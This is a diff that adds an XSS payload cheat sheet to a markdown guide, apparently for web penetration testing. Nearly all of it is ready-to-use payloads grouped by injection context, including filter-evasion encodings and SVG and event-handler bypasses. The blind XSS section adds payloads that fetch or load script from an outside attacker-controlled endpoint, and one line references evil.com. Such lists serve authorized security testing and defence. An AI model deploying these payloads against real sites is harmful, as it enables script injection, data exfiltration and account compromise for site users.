@@ -112,3 +112,218 @@ In the example below `UserInput` is being replaced with xss injection `"><script
 ```html
 <img src="/resources/images/tracker.gif?searchTerms="><script>alert(3)</script>//">
 ```
+
+---
+
+## 1. Basic Reflection / Sanity Checks
+
+Good for confirming *any* reflection at all.
+
+```html
+<script>alert(1)</script>
+```
+
+```html
+"><script>alert(1)</script>
+```
+
+```html
+'><script>alert(1)</script>
+```
+
+```html
+<script>confirm(document.domain)</script>
+```
+
+---
+
+## 2. HTML Context (Inside the DOM)
+
+When input is injected directly into HTML.
+
+```html
+<img src=x onerror=alert(1)>
+```
+
+```html
+<svg onload=alert(1)>
+```
+
+```html
+<iframe src=javascript:alert(1)>
+```
+
+```html
+<details open ontoggle=alert(1)>
+```
+
+---
+
+## 3. Attribute Context
+
+When your input lands **inside an attribute value**.
+
+```html
+" onmouseover="alert(1)
+```
+
+```html
+' onfocus='alert(1) autofocus='
+```
+
+```html
+"><img src=x onerror=alert(1)>
+```
+
+```html
+javascript:alert(1)
+```
+
+(especially useful in `href`, `src`, `data-*` attributes)
+
+---
+
+## 4. JavaScript Context
+
+When input is reflected inside `<script>` or inline JS.
+
+```js
+';alert(1);// 
+```
+
+```js
+");alert(1);//
+```
+
+```js
+`);alert(1);//`
+```
+
+```js
+</script><script>alert(1)</script>
+```
+
+---
+
+## 5. Event Handler Injection
+
+Often works when `<script>` is filtered.
+
+```html
+<body onload=alert(1)>
+```
+
+```html
+<input autofocus onfocus=alert(1)>
+```
+
+```html
+<button onclick=alert(1)>Click</button>
+```
+
+```html
+<div onpointerenter=alert(1)>hover</div>
+```
+
+---
+
+## 6. SVG-Based XSS (Very Common Bypass)
+
+SVG is still a goldmine in 2026.
+
+```html
+<svg><script>alert(1)</script></svg>
+```
+
+```html
+<svg onload=alert(1)>
+```
+
+```html
+<svg><animate onbegin=alert(1) attributeName=x></animate></svg>
+```
+
+---
+
+## 7. URL / Protocol Handler XSS
+
+Useful in links, redirects, or markdown renderers.
+
+```html
+javascript:alert(1)
+```
+
+```html
+data:text/html,<script>alert(1)</script>
+```
+
+```html
+vbscript:msgbox(1)
+```
+
+```html
+//evil.com/%0aalert(1)
+```
+
+---
+
+## 8. Filter Evasion / Encoding Tests
+
+To test weak sanitizers.
+
+```html
+&lt;script&gt;alert(1)&lt;/script&gt;
+```
+
+```html
+%3Cscript%3Ealert(1)%3C/script%3E
+```
+
+```html
+&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
+```
+
+```html
+<scr<script>ipt>alert(1)</scr<script>ipt>
+```
+
+---
+
+## 9. DOM XSS (Client-Side)
+
+When sinks like `innerHTML`, `document.write`, etc. are used.
+
+```html
+#"><img src=x onerror=alert(1)>
+```
+
+```html
+#<svg onload=alert(1)>
+```
+
+```js
+location.hash
+document.referrer
+window.name
+```
+
+(Always inspect JS for these sinks.)
+
+---
+
+## 10. Blind XSS Payloads
+
+Great for **admin panels, logs, support tools**.
+
+```html
+<img src=x onerror=fetch('https://your-xss-endpoint')>
+```
+
+```html
+<script src=https://your-xss-endpoint></script>
+```
+
+```html
+<svg onload=fetch('https://your-xss-endpoint')>
+```
+
